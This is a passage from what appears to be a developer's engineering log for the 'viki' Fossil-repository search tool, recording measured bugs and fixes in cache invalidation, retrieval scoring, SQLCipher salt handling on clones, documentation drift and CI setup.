is local CPU and the churn, and it would be paid on every `viki cache push`
whether or not the model changed. `viki_cache.c` therefore does the
comparison fossil does not: it exports the published
`viki-model/viki-manifest.json` and compares it to the local one, skipping all
three model blobs when the epoch is unchanged. The manifest is the right
witness because it *is* the epoch pin (VIKI_DESIGN.md) -- it carries
`model_id` plus the sha256 of both blobs. Consequence, deliberate: editing
`model.onnx` without bumping the manifest does not re-publish it.

---

## Unversioned-file names may contain `/`, but not whitespace, `..`, or a leading `/` -- and the failure is a `fossil_fatal`, i.e. a dead push

**Date:** 2026-08-13, picking uv names for the model blobs.

Fossil's uv help says nothing about what a legal name is. `unversioned_cmd()`
requires `file_is_simple_pathname()` and rejects empty, absolute, "complex"
(`.`/`..` components), whitespace-containing, and >500-byte names with
`fossil_fatal`. A `/` is fine, which is what makes a `viki-model/` prefix
usable as a namespace for the three model blobs:

```
$ fossil uv add model.onnx --as viki-model/model.onnx   # rc=0
$ fossil uv add model.onnx --as "viki model/x"          # fatal: unversioned filenames
                                                        # may not contain whitespace
```

Worth knowing because `viki cache push` runs `uv add` *before* `uv sync`: a
name fossil rejects fails the push after the cache blob has already been
written locally, the same half-completed-push shape already documented for a
missing remote URL.

---

## "Orphaned chunks are harmless, they just accumulate" was wrong: nothing invalidated `viki_source` either, so withdrawn content stayed at rank 1 forever -- and the obvious fix (delete everything not seen this run) would have destroyed the cache on any subdirectory index

**Date:** 2026-08-13, implementing invalidation in `viki index`.

AGENTS.md filed this under "Not yet built" as *"Garbage collection of
orphaned chunks. When a file's content changes, the old content_hash's
chunk rows are never deleted (harmless -- content-addressed, rebuildable,
D-10 -- but will accumulate)."* Two of those words do not survive contact
with a measurement.

**It is not "harmless", and it is not only about chunks.** `viki_source`
was never invalidated either, so the defect is not a growing table, it is
`viki ask` serving text the user withdrew:

```
$ viki index .                                  # 2 file(s) scanned, 2 (re)chunked
$ <rewrite docs/barn.md to unrelated text>
$ viki index .                                  # 2 file(s) scanned, 1 (re)chunked
$ viki ask "horses water trough"
[1] rrf=0.0328  (source path unknown)#0
    Six [horses] were grazing near the [water] [trough] behind the barn ...   <-- REPLACED text, rank 1

$ rm docs/tax.md && viki index .                # 1 file(s) scanned, 0 (re)chunked
$ viki ask "quarterly estimated tax deadline April"
[1] rrf=0.0328  ./docs/tax.md#0
    The [quarterly] [estimated] [tax] [deadline] is [April] 15 ...            <-- DELETED file, rank 1, full path
```

Note the second one especially: the deleted file is served *under its own
path*, so a caller has no signal at all that it is stale. The first at
least degrades to `(source path unknown)`, because `upsert_source()`
rewrites the path row in place and leaves the old hash's chunk with no
referrer -- that is the "accumulation" the old bullet described, and even
it is retrievable, since `viki ask`'s BM25 leg queries `chunk_fts` by
MATCH alone and never joins `viki_source`.

**The surprise worth recording is the fix's scoping, not the fix.** The
one-line version -- delete every `viki_source` row not seen this run --
is catastrophic, in two independent ways, both reproducible:

1. **`viki index` accepts a subdirectory.** `viki index docs` would sweep
   every row outside `docs/` on the grounds that it "didn't see" them.
2. **Extraction failure is indistinguishable from emptiness.** `fossil
   wiki list` prints nothing both when a repo has no wiki pages and when
   there is no `fossil` binary at all -- `run_capture()` discarded the
   child's exit status, so *no caller could have told the difference*.
   Running `viki index` on a machine without fossil would have deleted
   every `wiki:`, `ticket:` and `forum:` row in the cache.

So invalidation is scoped by **provable observation**: filesystem paths
only beneath the directory actually walked (and only if every `opendir()`
in that subtree succeeded), each virtual namespace only if its extractor
exited 0. `run_capture()` gained an exit-status out-param specifically to
make (2) decidable. Measured, with `VIKI_FOSSIL_BIN` pointed at a
nonexistent file:

```
viki index: 2 file(s) scanned, 0 (re)chunked; 0 wiki page(s), ... 0 forum post(s), 0 (re)chunked
viki index: 0 stale source(s) retired, 0 orphan chunk(s) removed
viki index: not authoritative this run for wiki: ticket: forum: -- existing entries there left in place
```

All 4 sources, 4 chunks and 4 `chunk_fts` rows unchanged, and the wiki,
ticket and forum text all still retrievable. The same repo *with* fossil
available retires a wiki page that was really deleted, and leaves the
ticket and forum rows alone.

**Three more things that only showed up by measuring:**

- **A superseded forum post that was indexed while it was current stayed
  retrievable forever, and the `fprev` fix from the previous round could
  not reach it.** That fix stops viki *re-indexing* superseded artifacts;
  it does nothing about one already in the cache. Post a reply, index,
  then edit the reply: before, `forum:` rows go 2 -> 3 and the withdrawn
  wording still answers a query; after, rows stay 2 (`1 stale source(s)
  retired, 1 orphan chunk(s) removed`) and only the edited text answers.
- **The GC must not be filtered by `model_id`,** which is the opposite of
  the instinct that `PRIMARY KEY(content_hash, model_id, chunk_ix)`
  invites. An unreferenced `content_hash` is unreachable under *every*
  epoch at once, and since `chunk_fts` is never filtered by `model_id`
  anywhere in `viki_ask.c`, sparing another epoch's row would leave the
  withdrawn text fully searchable -- i.e. would not fix the bug at all.
- **`viki index .` and `viki index docs` record different spellings of the
  same file** (`./docs/x.md` vs `docs/x.md`). Before invalidation existed
  these silently accumulated as duplicate rows; now the scope test
  lexically normalizes both sides, so a stale row written under one
  spelling is visible to a sweep run under the other. The visible effect
  is that alternating the two forms re-keys rows (`2 stale source(s)
  retired`, `0 orphan chunk(s) removed`) -- no content is lost, but the
  count is not zero and that is expected, not a bug.

**Honest limits, all biased toward keeping too much** (D-10 makes a missed
deletion recoverable; a wrong deletion is not): a row stored under an
absolute path is not swept by a relative `viki index .`, since deciding
that needs `realpath()` on a file that has just been deleted; any path
containing `..` is refused rather than resolved; and an unreadable
directory suppresses the sweep for its whole subtree. One consequence is
not a limit but a real trade-off worth knowing: a cache **pulled** from a
peer and then re-indexed in a tree that lacks those files *will* retire
their rows -- right for the local view, but it throws away D-11's
compute-once work, so do not `viki index` in a fresh clone you only meant
to query.

**Wrong assumption this replaces:** that un-GC'd chunks were a tidiness
issue deferrable to post-M1 ("harmless ... but will accumulate"), and that
invalidation is a simple mark-and-sweep. It is a retrieval-correctness
bug, and the sweep is only safe once "I did not see it" is distinguished
from "I could not look".

---

## A cache holding two `model_id` epochs does not merely inflate `viki ask` scores -- it reorders the top-K and drops documents out of it entirely (9 of 12 queries), because the BM25 leg was scored once per epoch

**Date:** 2026-08-13, fixing KICKOFF.md deliverable 2 in `src/viki_ask.c`.

The entry below (```viki ask```'s "hybrid mode" banner..., item 4) already
found this double-count and judged it **"Harmless for correctness (the cache
is derived, D-10)"**. That judgement is wrong, and the reason it looked
harmless is that it was measured on a three-document corpus where every score
happened to move the same way. On a fifteen-document corpus, **9 of 12 queries
came back in a different ORDER -- several with a different SET of documents --
depending only on whether the cache held one model epoch or two**:

```
# same 15 docs, same query, same pre-fix binary (build/dist/viki).
# hetM = indexed once, with a model.   hetX = indexed with no model, then with one.
$ viki ask "the tax receipts and the mileage log" --k 8     # hetM, 1 epoch
1 rrf=0.0328 a06.md  2 rrf=0.0308 a13.md  3 rrf=0.0306 a10.md  4 rrf=0.0304 a02.md
5 rrf=0.0303 a14.md  6 rrf=0.0302 a09.md  7 rrf=0.0301 a04.md  8 rrf=0.0290 a01.md
$ viki ask "the tax receipts and the mileage log" --k 8     # hetX, 2 epochs
1 rrf=0.0489 a06.md  2 rrf=0.0462 a13.md  3 rrf=0.0450 a02.md  4 rrf=0.0430 a01.md
5 rrf=0.0425 a10.md  6 rrf=0.0424 a14.md  7 rrf=0.0421 a05.md  8 rrf=0.0419 a03.md
```

`a01.md` climbs from rank 8 to rank 4; `a09.md` and `a04.md` fall out of the
top 8 altogether. The scores are not tied at those boundaries (0.0430 vs
0.0425), so this is a real reordering, not qsort tie-break noise. Nothing
about the query or the documents changed -- only how many peers had pushed to
the cache.

**Why.** `chunk_fts` holds one row per `(content_hash, model_id, chunk_ix)`;
`run_fts()` filtered by neither, and `find_or_add()` keys candidates on
`(content_hash, chunk_ix)`. Two epochs of the same content therefore put two
identical FTS rows in front of BM25, which merged into one candidate and
collected the keyword leg's `1/(k+rank)` contribution **twice** -- while the
vector leg, correctly `WHERE model_id=?1`, contributed once. The fusion
silently reweights itself toward BM25 in proportion to how many epochs are in
the db. Measured on one hit, same query, epochs added synthetically after the
first two (`INSERT INTO chunk_fts ... SELECT ..., 'peer-model-2', ...`):

```
1 epoch  rrf=0.0328  = 1/61 + 1/62                  (BM25 rank 1, vector rank 2)
2 epochs rrf=0.0489  = 1/61 + 1/62 + 1/61           (BM25 counted twice)
3 epochs rrf=0.0648
5 epochs rrf=0.0958
```

**This is the normal steady state of D-11 sharing, not a lab setup.** A peer
with no model indexes under `model_id='none'`; a peer with a model indexes
under its own id; both push to the same latest-wins `viki-cache.db` uv blob.
Anyone who then pulls gets a two-epoch cache. `test/m1.sh` sidesteps it by
giving each mode a virgin `.viki/cache.db` (its own comment says so) -- which
is right for the test and is exactly why the bug survived: no assertion ever
looked at a mixed cache.

**Fix** (`src/viki_ask.c`): a `leg_hit()` helper records a per-leg bit on the
candidate, so each retrieval leg scores a given `(content_hash, chunk_ix)` at
most once, at its best (first, since both legs feed rows best-first) rank.
Ranks now count distinct chunks rather than rows, so the fused scores are
*identical* to a single-epoch cache's rather than merely deduplicated.

**Not fixed by filtering `chunk_fts` on the asker's `model_id`**, which is the
obvious-looking alternative and is wrong: a chunk may exist only under
`model_id='none'`, and `viki ask` **with no model at all** -- which has no
`model_id` to filter by -- must still search a cache that a model-having peer
built. That is the entire point of `viki cache pull` (D-11/D-12, and
`test/m1.sh` C17 asserts it). Filtering would drop exactly the rows the pull
was for, converting a scoring bug into a silent recall bug. BM25 also does not
depend on `model_id` at all -- the only indexed column is `chunk_text`, byte
identical across epochs -- so the duplicate rows carry no information and
collapsing them loses nothing.

**Verified fixed.** Same corpus, same queries, patched binary: the ranked list
(rank, score, document) from a 1-, 2-, 3- and 5-epoch cache is byte-identical,
in both hybrid and degraded mode, and identical to what the pre-fix binary
produced on a single-epoch cache (so single-epoch behaviour did not move).
All 12 queries that previously disagreed now agree.

```
$ diff <(ask hetM) <(ask hetX)      # pre-fix:  9/12 queries differ
$ diff <(ask hetM) <(ask hetX)      # post-fix: 0/12 differ (also vs 3- and 5-epoch)
```

**The same change makes `viki ask` print the `content_hash`** -- KICKOFF.md
deliverable 2's "results with source content_hash", which the CLI never
printed (only the best-effort `viki_source` path, which prints
`(source path unknown)` for any chunk whose path row is stale). The hit
header line is now:

```
[1] rrf=0.0328  a2cde14f...(64 hex)...d0a7#0  ./docs/a01.md
 ^rank ^score    ^content_hash        ^chunk_ix  ^source path (may contain spaces / be unknown)
```

Same value and semantics as `/api/ask`'s `hash` field, and `<hash>#<ix>` are
exactly `/api/chunk?hash=&ix=`'s two parameters. **Anything that greps that
line must be updated**: the rank-1 regex becomes
`^\[1\] rrf=[0-9]+\.[0-9]{4}  [0-9a-f]{64}#0  ` followed by the (now
unanchored-from-`#0`) source path. `^\[[0-9]+\] rrf=` -- the count/ANYRANK
prefix -- is unchanged. Running `test/m1.sh` against the patched binary gives
44 passed / 10 failed, and all 10 failures are that one regex; every one of
them shows the correct document at rank 1 with an unchanged score.

**Wrong assumption this replaces:** that a mixed-epoch cache only shifts
scores uniformly ("harmless"), and that the double-count was a testing
inconvenience rather than a retrieval-quality bug.

---

## A local-path `fossil-see clone` copies the source repo's SQLCipher salt into the destination; only an `http://` clone gets a fresh one -- so "re-clone into a fresh key" only works over the network

**Date:** 2026-08-13, verifying `test/m1.sh`'s encryption assertions
first-hand rather than trusting E1's own word for them.

E1 asserts the hub is ciphertext by checking its first 15 bytes are not
`SQLite format 3`. That assertion is sound and non-vacuous (E2's control
proves it can fail). But looking at the *whole* header of every repo in a
kept scratch tree turns up something E1 does not test for: all five
`*.efossil` files share the **same first 16 bytes**, and differ from byte
17 on.

```
$ VIKI_TEST_KEEP=1 bash test/m1.sh          # -> /tmp/viki-m1.XXXXXXXX
$ for f in $W/*.efossil; do printf '%-14s %s\n' "$(basename $f)" \
      "$(head -c 16 "$f" | xxd -p)"; done
bm25.efossil   0a701de13cb55f98558103cb2ed0358a
fresh.efossil  0a701de13cb55f98558103cb2ed0358a
hub.efossil    0a701de13cb55f98558103cb2ed0358a
vec.efossil    0a701de13cb55f98558103cb2ed0358a
work.efossil   0a701de13cb55f98558103cb2ed0358a
```

Those 16 bytes are SQLCipher's PBKDF2 **salt**, stored in cleartext at the
head of the file. Confirmed as key-derivation input rather than a
coincidental constant by flipping one bit of byte 0 of a *copy* and
re-opening with the correct passphrase:

```
$ cp a.efossil b.efossil
$ fossil-see timeline -n 1 -R b.efossil            # rc=0, opens fine
$ # flip bit 0 of byte 0, nothing else (cmp -l reports exactly 1 byte differs)
$ fossil-see timeline -n 1 -R b.efossil
SQLITE_NOTADB(26): file is not a database in "SELECT fts5(?1)"
not a valid repository: .../b.efossil                # rc=1
```

`init` does generate a fresh random salt every time -- two `init`s with
the *same* key give different salts, so this is not "fossil-see hardcodes
a salt". It is the **local-path clone** that propagates it:

```
$ export FOSSIL_SEE_KEY=probe-key-123
$ fossil-see init --admin-user t hub.efossil     ; head -c 16 hub.efossil | xxd -p
55fe506df3775e7d37965c6123cb08b4
$ fossil-see clone --no-open hub.efossil c1.efossil ; head -c 16 c1.efossil | xxd -p
55fe506df3775e7d37965c6123cb08b4       # same
$ fossil-see clone --no-open hub.efossil c2.efossil ; head -c 16 c2.efossil | xxd -p
55fe506df3775e7d37965c6123cb08b4       # same
$ fossil-see init --admin-user t hub2.efossil    ; head -c 16 hub2.efossil | xxd -p
1eb2b683128172b743353ded1685392a       # a fresh init is fresh
```

**The consequence that matters is not the salt itself** -- SQLCipher still
uses a random per-page IV, and inside one clone family everybody is using
the same passphrase anyway, so nothing is disclosed that was not already
shared. The consequence is for `ENCRYPTION.md`'s **key management**
section, which offers "re-clone into a fresh key" as one of the two
rotation paths and claims (item 4) "Two clones of the same hub, each under
a different SQLCipher key, both sync". Over a **local path** that does not
work at all, and it fails *after* creating the destination file:

```
$ FOSSIL_SEE_KEY=hub-key-AAA    fossil-see init --admin-user t hub.efossil
$ FOSSIL_SEE_KEY=device-key-BBB fossil-see clone --no-open hub.efossil dev.efossil
SQLITE_NOTADB(26): file is not a database in "SELECT fts5(?1)"
not a valid repository: .../dev.efossil                        # rc=1
$ head -c 16 dev.efossil | xxd -p
f89dcd795e1d9e46579e31e5d505014c   # == hub's salt; the file is left behind, unusable
```

Over **`http://`** it works exactly as ENCRYPTION.md describes, and the
salt is fresh:

```
$ FOSSIL_SEE_KEY=hub-key-AAA fossil-see server hub.efossil --port 9123 --localauth &
$ FOSSIL_SEE_KEY=device-key-BBB fossil-see clone --no-open http://127.0.0.1:9123/ dev.efossil
Clone done, wire bytes sent: 522  received: 1342  remote: 127.0.0.1   # rc=0
$ head -c 16 hub.efossil | xxd -p ; head -c 16 dev.efossil | xxd -p
d475e3672465814cbbb4980aa13084d9
2b10385353c5756a72375912538f0242            # different -- fresh salt
$ FOSSIL_SEE_KEY=device-key-BBB fossil-see timeline -n 1 -R dev.efossil   # opens
$ FOSSIL_SEE_KEY=hub-key-AAA    fossil-see timeline -n 1 -R dev.efossil   # does NOT
```

The pattern fits: `FOSSIL_SEE_KEY` is one key for one process, so a
local-path clone has both repositories open under one key in one process
and the destination inherits the source's salt, while a network clone only
ever touches the destination.

**Wrong assumption this replaces:** that the transport in `fossil clone`
is a performance/convenience detail with no bearing on encryption, so a
`file://`-style local clone is a faithful stand-in for the real hub/spoke
topology when testing encryption properties. For *this* repo's purposes it
is -- `test/m1.sh` uses one key throughout by design, and E1-E4 are
unaffected -- but ENCRYPTION.md's per-device-key and key-rotation claims
are network-transport claims, and nothing in the tree exercises them.
`test/m1.sh` clones by local path only (`fclone()`), so it cannot catch a
regression in either.

---

## Running `build/m1-e2e-probe.sh` writes into the developer's real `~/.config/fossil.db`; `test/m1.sh` does not

**Date:** 2026-08-13, chasing an mtime on the global fossil config db that
turned out not to be `test/m1.sh`'s fault.

While confirming `test/m1.sh` leaves no state outside its scratch tree,
`~/.config/fossil.db` (the real global fossil config db, not `~/.fossil`
on this machine) showed a modification time inside the window of the test
runs. It was not the test:

```
$ shasum -a 256 ~/.config/fossil.db      # before
7e78712439926c6fc1a6b23ed1f84a3504351775a19ffd407aef4b496170d7c4
$ ( cd /tmp && bash test/m1.sh )         # 54 passed, 0 failed, 0 skipped
$ shasum -a 256 ~/.config/fossil.db      # after -- byte-identical, mtime unchanged
7e78712439926c6fc1a6b23ed1f84a3504351775a19ffd407aef4b496170d7c4
```

`test/m1.sh` exports `FOSSIL_HOME="$WORK/fossilhome"` (line 204) and the
kept tree confirms every global write landed there
(`$WORK/fossilhome/.fossil`, 12288 bytes). The polluter is the older
probe, which sets no `FOSSIL_HOME` at all:

```
$ grep -c FOSSIL_HOME build/m1-e2e-probe.sh
0
$ sqlite3 ~/.config/fossil.db \
    "select name from global_config where name like '%viki-m1%';"
ckout:/private/tmp/viki-m1-final/fresh/
ckout:/private/tmp/viki-m1-final/spoke/
repo:/private/tmp/viki-m1-final/fresh.efossil
repo:/private/tmp/viki-m1-final/spoke.efossil
```

`/private/tmp/viki-m1-final` is `build/m1-e2e-probe.sh`'s hard-coded
scratch path, so those four rows are its residue, and they persist after
the probe's tree is deleted.

**Wrong assumption this replaces:** that the two scripts differ only in
portability of their paths. AGENTS.md already prefers `test/m1.sh` over
the probe and cites the hard-coded absolute paths; this is the concrete
cost of that difference -- the probe permanently dirties the developer's
global fossil config, and it also means an agent auditing "did the test
leave state behind?" can be sent chasing another script's leftovers.

---

## "Docs move in the same commit as the code" does not survive contact with itself: AGENTS.md called a gap "a real gap" for 14 hours after the commit that closed it -- and the commit message said it closed it

**Date:** 2026-08-13, truing up AGENTS.md/CLAUDE.md after the m1-test,
forum and CI rounds.

The repo's central process rule is that a doc is updated in the same
commit as the code that makes it stale. That rule was *followed* and the
doc still went stale, four separate ways in one file, because the rule
implicitly assumes each claim lives in exactly one place. None of these
are sloppiness by any single agent; they are a structural property of a
file that states the same fact in a narrative section, a layout table and
a to-do list.

**1. A bullet outlived its own fix commit.** `AGENTS.md`'s "Not yet built"
list said, until this pass:

> CI doesn't currently copy that DLL into the release artifact alongside
> `viki.exe` the way `onnxruntime.dll` is -- a real gap for anyone who
> downloads just `viki.exe` without an MSYS2 install on their machine.

Commit `478b8e3` ("Windows CI is green: promote out of experimental,
bundle msys-2.0.dll", 2026-08-13 03:02) had already closed it, and its
own message says so ("now copied next to viki.exe the same way
onnxruntime.dll already is"). That commit did update AGENTS.md -- it added
the `.github/workflows/build.yml` layout entry and resolved the cross-arch
model caveat, both listed in its own commit message
(`git show 478b8e3 -- AGENTS.md`) -- and left the to-do bullet, three
screens away from anything it edited, contradicting all of it.

Checked against the shipped bytes rather than the scripts, because the
scripts are what was already believed:

```
$ gh run download 31723892765 -n viki-windows-x86_64 -D /tmp/winart
$ ls /tmp/winart
model
msys-2.0.dll                        # 3367041 bytes -- the bullet said this was absent
onnxruntime.dll
onnxruntime_providers_shared.dll
viki.exe
```

(Run 31723892765 is the `build` workflow on the current tip of `main`;
artifacts have 30-day retention, so use a recent green run id.)

Source side, for completeness: `build/build.sh`'s Windows branch copies
`msys-2.0.dll` (falling back to `/usr/bin/msys-2.0.dll`, else printing a
`WARN:`), and both `.github/workflows/build.yml` and `release.yml` stage
`build/dist/*.dll` wholesale rather than naming `onnxruntime.dll`.

**2. One bullet contradicted itself internally.** The forum bullet's
headline said the three parsing fixes were "FIXED IN SOURCE (but not yet
in `build/dist/viki`)", a paragraph *inside the same bullet* said
"**Caveat RESOLVED** ... the shipped binary carries all three fixes", and
a third bullet 80 lines down repeated the stale half again ("fixed in
source but not in the built binary"). Two of three said the false thing.
A reader who stopped at the headline -- the normal way a to-do list is
read -- got the wrong answer.

**3. A handoff report's claim went stale before it could be copied into a
doc.** The forum round's write-up stated, correctly at the time, that
`test/m1.sh` "contains zero occurrences of `forum`". Copying that
sentence into AGENTS.md would have shipped a false claim:

```
$ grep -ci forum test/m1.sh
8
```

All eight are inside one comment block added later by m1.sh's author,
explaining *why* no forum post is planted -- headed "DELIBERATELY NOT
PLANTED: a forum post", at line 372 of the 54-assertion file this was
measured against and at lines 415-427 of the 90-assertion one that
replaced it. (Cite the heading, not the line number: the file grew by
27k and every number in it moved. Line 372 today is an unrelated
FTS5-stopword comment -- a citation that silently became wrong while
still looking precise.) The underlying scope
fact was still true; the stated evidence for it was not. In a repo where
agents hand each other prose summaries, **a report is a snapshot of a file
at a moment, and pasting its sentences into a doc launders an unverified
claim into documented truth.** Re-run the grep, don't quote the report.

**4. The doc under-claimed in one place while over-claiming in another,
and the correction nearly went in backwards.** AGENTS.md's "Verified
working end to end" section described the D-11 compute-once loop as having
been proven on a plain `.fossil` hub, with the caveat that it "predates the
embedding pipeline -- worth re-running with a model present to confirm
embeddings round-trip through `fossil uv`; not yet done". Both halves were
stale: `build/m1-e2e-probe.sh` -- untracked, unlisted in the layout, and
therefore invisible to exactly the brand-new agent AGENTS.md exists for --
had already run the whole loop on an **encrypted** hub *and* asserted the
embedding round trip (its C7). The first draft of this pass therefore
credited `test/m1.sh` with being "the first time the M1 loop has been
proven on a `*.efossil` repo", which is false; reading the probe caught
it. The honest statement is narrower: `test/m1.sh` is the *tracked,
portable, CI-wired* version, and some of its assertions are strictly
stronger -- the probe's C7 is

```
check "C7 embeddings round-tripped byte-identically" "[ \"\$SPOKE_FP\" = \"\$FRESH_FP\" ]"
```

with no non-empty guard, so two failed `sqlite3` reads both yielding `""`
pass it; m1.sh's C11 requires `[ -n "$SPOKE_FP" ]` first. **An untracked
file in `build/` is not documentation, and a doc that omits it will
mis-attribute the work it did.**

**Wrong assumption it replaces:** that "update the doc in the same commit"
is self-enforcing, and that a green handoff report can be transcribed.
Neither holds. What actually works, and what this pass did: before editing
a doc claim, (a) `grep` the whole file for the *other* places the same
fact appears, and (b) verify the claim against an artifact -- a downloaded
CI artifact, `strings`/`nm` on the binary, a re-run of the probe -- rather
than against the source that was supposed to produce it. Every number
restated in AGENTS.md this pass was re-measured first-hand rather than
carried over: `bash test/m1.sh` -> `54 passed, 0 failed, 0 skipped`,
exit 0; `sh build/forum-e2e-probe.sh <empty-dir>` -> `PASS=26 FAIL=0`;
`sh build/m1-e2e-probe.sh <empty-dir>` -> `PASS=37 FAIL=0`.

---

## KICKOFF.md's `experiments/harness.c` regression gate is unrunnable on this machine AND unnecessary -- viki imports zero Fossil symbols, so there is nothing for it to regress

**Date:** 2026-08-13, resolving the last open definition-of-done item.

KICKOFF.md's definition of done for Milestone 1 includes "Re-run
`experiments/harness.c` against your fossil-see build -- still ALL PASS
(regression gate)". It has sat in AGENTS.md's "Not yet built" list for the
whole milestone, reading like an outstanding failure. It is neither
satisfiable nor needed, and both halves are measurable.

**Unrunnable.** `experiments/harness.c`'s own header build recipe requires
GNU binutils and GNU ld:

```
**   objcopy --redefine-sym main=fossil_cli_main bld/main.o bld/main_h.o
**      -Wl,--wrap=exit -lresolv -lssl -lcrypto -lz -ldl -lpthread -lm
```

On the only dev machine this project has:

```
$ which objcopy;        # not found
$ which llvm-objcopy;   # not found
$ xcrun -f objcopy
xcrun: error: unable to find utility "objcopy", not a developer tool or in PATH
```

The `-Wl,--wrap=exit` half is obsolete on top of that: the live harness in
`../fossil-sqlcipher-libressl/embed/` replaced it with a registered
`fossil_exit()` handler (`fossil_embed_init()`) specifically to be
portable to Apple's linker.

**Unnecessary.** The gate protects in-process Fossil. viki has none --
every Fossil operation is a subprocess via `viki_fossil_binary()`. That is
usually asserted from the design; here it is measured from the shipped
binary:

```
$ nm build/dist/viki | grep -i fossil
00000001000066f8 t _unquote_fossil
00000001000070a4 T _viki_fossil_binary
0000000100007214 T _viki_fossil_user
$ strings build/dist/viki | grep -c "fossil_cli_main\|fossil_embed_init"
0
```

The **full** symbol table is the proof, and it has to be. This entry
originally cited `nm -u build/dist/viki | grep -ic fossil` -> `0` and
reasoned "zero *undefined* Fossil symbols means nothing Fossil is linked
at all". That inference is **unsound**: `nm -u` lists only *undefined*
symbols -- exactly the ones a **dynamically** linked dependency leaves
behind. Statically linked code contributes *defined* symbols, which
`nm -u` never prints, so a statically linked in-process Fossil would have
produced the identical `0`. (The whole point of the neighbouring
`ndvss-selftest` is that viki *does* statically link something --
sqlite-ndvss -- so this is not a hypothetical.) The conclusion survives;
the cited evidence did not establish it. What the full table shows is
that the only Fossil-named symbols in the binary are viki's own three,
in any linkage form: nothing Fossil is present, so no harness result can
change any viki behaviour. Meanwhile the live
harness, in the repo that now owns it, is ALL PASS with 0 failures per
`../fossil-sqlcipher-libressl/embed/README.md` (verified there from a
clean-room rebuild). So the gate is closed **by reference**: the thing it
guards is all-pass where it lives, and it guards nothing here.

**Wrong assumption it replaces:** that an unsatisfied definition-of-done
bullet is always work owed. This one was made vacuous by a *decision*
taken during the milestone -- subprocess-only Fossil -- and a snapshot
directory (`experiments/`) that was frozen and superseded underneath it.
The residual obligation is not "run the harness"; it is "do not resume FFI
work from the frozen snapshot" -- read
`../fossil-sqlcipher-libressl/embed/README.md`, whose shim rules have
already grown two more required `fossil_reset_*()` calls per command since
`experiments/db-embed.patch` was written.

---

## Putting `test/m1.sh` in CI is not "add a `run:` line": it exits 0 while skipping the entire vector proof, and the fossil binary it needs does not build on the CI image

**Date:** 2026-08-13, wiring `test/m1.sh` into `.github/workflows/build.yml`.

Everything below was measured by running the whole CI job locally in
`docker run --platform linux/amd64 debian:bookworm` -- the same image the
`build` job's linux-x86_64 leg uses -- not reasoned about. Three of the
four findings would have produced a red or a fake-green job on the first
real CI run.

**1. m1.sh returns 0 for a run that skipped the single most important
assertion in it.** Its contract is exit 0 unless an *attempted* assertion
fails; skips are printed loudly and counted, and the summary says
outright "NOT a full Milestone 1 pass on its own" -- but CI reads exit
status, not prose.

```
$ VIKI_MODEL_DIR=/tmp/no-such-model bash test/m1.sh; echo "exit=$?"
test/m1.sh: 43 passed, 0 failed, 11 skipped
RESULT: PASS WITH SKIPS ...
exit=0
```

Those 11 include B5 (the semantic-only retrieval that is the *only*
evidence the vector leg is real) and C16 (the pulled vectors working).
A green check mark, with rung 2 never exercised. The CI step therefore
greps for `N passed, 0 failed, 0 skipped` and fails the job otherwise --
every skip m1.sh can emit is a missing dependency on the runner, never a
property of the code under test, so tolerating one is tolerating a
misconfigured job.

**2. `debian:bookworm` ships no `sqlite3` binary**, so the naive job
would have hit exactly that trap by default: E3/E3b (a stock SQLite
cannot open the encrypted repo) and B2/C11 (every chunk carries a real
384-float embedding; the vectors survived the uv round trip) would all
have been skipped, silently, forever.

```
$ docker run --rm --platform linux/amd64 debian:bookworm sh -c 'command -v sqlite3'; echo "exit=$?"
exit=127
```

**3. `vendor/fossil-see` does not build on `build-essential` + `cmake`.**
Fossil's configure wants zlib's *header*, and although Fossil vendors
`compat/zlib`, `--with-zlib`'s default does not fall back to it:

```
==> Configuring Fossil
Checking for zlib.h...not found
Error: zlib.h not found; either install it or specify its location via --with-zlib
```

That arrives ~90 seconds in, after LibreSSL and the SQLCipher
amalgamation have already been built -- a slow way to learn it. Fix:
`zlib1g-dev`. Two related probes, both negative: neither build needs a
system `tclsh` (Fossil and SQLCipher each bootstrap their own `jimsh0`,
printing "No installed jimsh or tclsh, building local bootstrap
jimsh0"), and `patch`/`perl`(`shasum`)/`make`/`cc`/`tar` all arrive with
`build-essential`.

**4. A stock `fossil` cannot substitute for the build.** m1.sh is not
merely *better* with fossil-see; it aborts without it -- `fclone()`
`die()`s when a clone destination comes back plaintext.

```
$ docker run --rm --platform linux/amd64 debian:bookworm sh -c '
    apt-get update -qq >/dev/null 2>&1 && apt-get install -y fossil >/dev/null 2>&1
    fossil version
    FOSSIL_SEE_KEY=some-key FOSSIL_HOME=/tmp fossil init --admin-user t /tmp/x.efossil >/dev/null
    printf "first 15 bytes: [%s]\n" "$(head -c 15 /tmp/x.efossil)"'
This is fossil version 2.21 [3c53b6364e] 2023-02-26 19:24:24 UTC
first 15 bytes: [SQLite format 3]
```

There is also nothing to download instead: `gh release list -R
wmacevoy/fossil-sqlcipher-libressl` is empty. So CI builds it, and
caches the resulting 7.9 MB binary keyed on the pinned submodule commit
(the whole `vendor/fossil-see` tree is 302 MB; the cache is 2.6% of it).
**Verified that a cache hit is sufficient**, rather than assumed: with
the entire submodule tree deleted and only
`vendor/fossil-see/build/dist/fossil-see` restored, m1.sh is still
`54 passed, 0 failed, 0 skipped`.

**5. The linux-arm64 exclusion is current, not inherited.** Rather than
cite the older entry below and move on, the same container treatment on
`--platform linux/arm64` re-confirms it today: `build/build.sh` exits 1
with `sqlite-ndvss.c:75: error: 'cosine_similarity_f_sve2' undeclared`
and five siblings. There is no viki binary to test there, so the m1
matrix announces the gap instead of pretending to cover it.

Measured cold costs on this machine (Rosetta-emulated amd64, so CPU
numbers are pessimistic and network numbers are this house's, not
GitHub's):

| step | time |
|---|---|
| `apt-get install` the deps | 45 s |
| `git submodule update --init vendor/sqlite-ndvss` | 2 s |
| `./build/build.sh` (viki + model) | 41 s |
| `git submodule update --init --recursive vendor/fossil-see` | 2 m 36 s / 5 m 14 s (two runs) |
| `./vendor/fossil-see/build/build.sh` | 2 m 33 s |
| `bash test/m1.sh` | 34 s |

The full linux-x86_64 job, end to end in that container, is
`54 passed, 0 failed, 0 skipped`.

**Wrong assumption it replaces:** that wiring the definition-of-done test
into CI means adding `bash test/m1.sh` to the existing build job. Every
clause of that is wrong: the test needs a binary CI does not have and
cannot download; the image it would run on is missing a tool the test
treats as optional and quietly drops four assertions for; and the test's
own exit status cannot distinguish "proved Milestone 1" from "proved
about 80% of it". The job also must NOT live inside `build`, because
`build` is the standing proof that viki compiles with `vendor/fossil-see`
untouched.

**Not verified:** the workflow has never run on GitHub's runners -- only
YAML validity (`yaml.safe_load`), GitHub Actions semantics
(`actionlint` 1.7.12 with shellcheck 0.11.0, plus a vacuity check that it
